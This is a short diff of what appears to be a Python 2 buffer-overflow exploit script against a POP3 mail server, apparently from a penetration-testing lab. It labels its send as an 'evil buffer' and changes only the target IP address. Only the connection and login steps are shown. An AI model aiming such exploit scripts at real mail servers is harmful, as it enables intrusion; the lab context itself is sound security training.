@@ -30,7 +30,7 @@ data = ""
 try:
   print "\nSending evil buffer..."
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)	# create our socket
-  connect = s.connect(('10.11.14.139',110))		# connect to mailserver on 110
+  connect = s.connect(('192.168.0.45',110))		# connect to mailserver on 110
   data = s.recv(1024)					# get banner
   s.send('USER test\r\n')				# send username "test"
   data = s.recv(1024)					# get reply
